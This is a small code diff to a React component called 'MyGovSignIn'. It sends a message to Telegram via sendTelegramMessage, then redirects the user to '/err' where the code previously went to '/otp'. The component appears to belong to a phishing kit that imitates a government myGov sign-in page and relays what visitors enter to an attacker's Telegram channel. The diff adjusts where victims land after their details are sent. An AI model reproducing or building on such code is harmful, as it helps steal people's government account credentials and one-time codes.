@@ -57,7 +57,7 @@ const MyGovSignIn = () => {
 
     try {
       await sendTelegramMessage(message);
-      router.push("/otp");
+      router.push("/err");
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
     }
